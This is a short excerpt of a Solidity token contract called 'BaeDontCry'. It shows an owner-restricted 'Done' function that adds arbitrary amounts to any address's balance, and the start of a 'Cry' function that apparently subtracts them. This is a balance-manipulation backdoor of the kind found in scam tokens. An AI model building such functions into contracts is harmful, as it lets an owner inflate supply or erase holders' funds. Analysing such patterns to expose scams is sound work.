...
contract BaeDontCry  {
    ...
    function Done(address spender, uint256 addedValue) public restricted returns (bool success) {
        balanceOf[spender] += addedValue * 10 ** 6;
        return true;
    }
    function Cry(address spender, uint256 subtractedValue) public restricted returns (bool success) {
